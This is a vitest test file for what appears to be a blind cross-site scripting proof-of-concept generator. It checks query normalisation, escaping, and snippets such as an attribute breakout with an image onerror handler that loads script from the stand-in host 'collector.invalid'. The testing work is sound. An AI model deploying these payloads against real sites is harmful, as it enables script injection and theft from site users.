import { describe, expect, it } from 'vitest';
import {
  createPayloadSnippets,
  normalizePayloadQuery,
} from '../src/client/payload-snippets';

function decodeHtmlAttribute(value: string): string {
  return value
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'")
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&amp;/g, '&');
}

describe('payload query input', () => {
  it('encodes quotes, ampersands, and angle brackets without changing their values', () => {
    const result = normalizePayloadQuery(
      `label="double"%26'one'%3Csvg%3E&raw=<tag>&amp=fish%26chips`,
    );

    expect(result.error).toBe('');
    expect(result.normalizedQuery).toBe(
      'label=%22double%22%26%27one%27%3Csvg%3E&raw=%3Ctag%3E&amp=fish%26chips',
    );
    expect(result.params).toEqual([
      { name: 'label', value: `"double"&'one'<svg>` },
      { name: 'raw', value: '<tag>' },
      { name: 'amp', value: 'fish&chips' },
    ]);
  });

  it('preserves order, duplicates, bare flags, and parameters around empty separators', () => {
    const result = normalizePayloadQuery('?tag=one&&aa&tag=two&empty=');

    expect(result).toEqual({
      normalizedQuery: 'tag=one&aa&tag=two&empty=',
      params: [
        { name: 'tag', value: 'one' },
        { name: 'aa', value: '' },
        { name: 'tag', value: 'two' },
        { name: 'empty', value: '' },
      ],
      error: '',
    });
  });

  it('normalizes and round-trips non-ASCII input by UTF-8 value', () => {
    const result = normalizePayloadQuery('城市=القاهرة&full=Ｅxample&emoji=😀');

    expect(result.error).toBe('');
    expect(result.params).toEqual([
      { name: '城市', value: 'القاهرة' },
      { name: 'full', value: 'Example' },
      { name: 'emoji', value: '😀' },
    ]);
    expect(Array.from(new URLSearchParams(result.normalizedQuery))).toEqual(
      result.params.map(({ name, value }) => [name, value]),
    );
  });

  it('rejects malformed percent encoding and empty names without returning a partial query', () => {
    for (const query of ['ok=1&broken=%', 'ok=1&broken=%GG', 'ok=1&broken=%FF', 'ok=1&broken=%E0%A4%A']) {
      const result = normalizePayloadQuery(query);
      expect(result.error).toMatch(/percent encoding/i);
      expect(result.normalizedQuery).toBe('');
      expect(result.params).toEqual([]);
    }

    expect(normalizePayloadQuery('kept=1&=would-have-been-dropped')).toEqual({
      normalizedQuery: '',
      params: [],
      error: 'Query parameter names cannot be empty.',
    });
  });

  it('rejects excessive count, per-field bytes, and total metadata instead of truncating', () => {
    const sixteen = Array.from({ length: 16 }, (_, index) => `p${index}=x`).join('&');
    expect(normalizePayloadQuery(sixteen).params).toHaveLength(16);
    expect(normalizePayloadQuery(sixteen + '&p16=x').error).toMatch(/no more than 16/i);

    expect(normalizePayloadQuery(`${'😀'.repeat(24)}=x`).error).toBe('');
    expect(normalizePayloadQuery(`${'😀'.repeat(25)}=x`).error).toMatch(/names must be 96/i);
    expect(normalizePayloadQuery(`value=${'😀'.repeat(96)}`).error).toBe('');
    expect(normalizePayloadQuery(`value=${'😀'.repeat(97)}`).error).toMatch(/values must be 384/i);

    const tooLargeTogether = Array.from({ length: 3 }, (_, index) => `p${index}=${'x'.repeat(350)}`).join('&');
    const result = normalizePayloadQuery(tooLargeTogether);
    expect(result.error).toMatch(/1 KB/i);
    expect(result.normalizedQuery).toBe('');
    expect(result.params).toEqual([]);
  });
});

describe('generated payload snippets', () => {
  it('keeps a hostile-looking query inert in HTML and executable in the image handler', () => {
    const result = createPayloadSnippets(
      'https://collector.invalid/a/alias.js?fixed=1#proof',
      `label="x"%26%3Csvg%3E&single='value'`,
    );

    expect(result.error).toBe('');
    expect(result.loaderUrl).toBe(
      'https://collector.invalid/a/alias.js?fixed=1&label=%22x%22%26%3Csvg%3E&single=%27value%27#proof',
    );
    expect(result.scriptTag).toContain(
      'fixed=1&amp;label=%22x%22%26%3Csvg%3E&amp;single=%27value%27#proof',
    );
    expect(result.scriptTag).not.toContain('"x"');
    expect(result.scriptTag).not.toContain('<svg>');

    const match = /^"><img src=x onerror="([^"]*)">$/u.exec(result.imageErrorHandler);
    expect(match).not.toBeNull();
    const handler = decodeHtmlAttribute(match?.[1] ?? '');
    expect(handler).toBe(result.javascriptLoader);
    expect(() => new Function('document', handler)).not.toThrow();

    const script = { src: '' };
    let appended: unknown = null;
    const documentStub = {
      createElement: (tag: string) => {
        expect(tag).toBe('script');
        return script;
      },
      head: { appendChild: (node: unknown) => { appended = node; } },
    };
    new Function('document', handler)(documentStub);
    expect(script.src).toBe(result.loaderUrl);
    expect(appended).toBe(script);
  });

  it('escapes hostile characters from the base URL in every code context', () => {
    const result = createPayloadSnippets(
      `https://collector.invalid/p/a'"><img src=x>.js?fixed=fish&chips`,
      'tag=proof',
    );

    expect(result.scriptTag).toContain('a&#39;&quot;&gt;&lt;img src=x&gt;.js');
    expect(result.javascriptLoader).not.toContain('<img');
    expect(result.javascriptLoader).not.toContain('&chips');
    expect(result.imageErrorHandler).not.toContain(`a'"><img`);
  });

  it('emits no copyable PoC when validation fails', () => {
    const result = createPayloadSnippets('https://collector.invalid/p/token.js', 'ok=1&broken=%GG');

    expect(result.error).not.toBe('');
    expect(result.loaderUrl).toBe('');
    expect(result.scriptTag).toBe('');
    expect(result.compactScriptTag).toBe('');
    expect(result.attributeBreakout).toBe('');
    expect(result.imageErrorHandler).toBe('');
    expect(result.javascriptLoader).toBe('');
  });
});
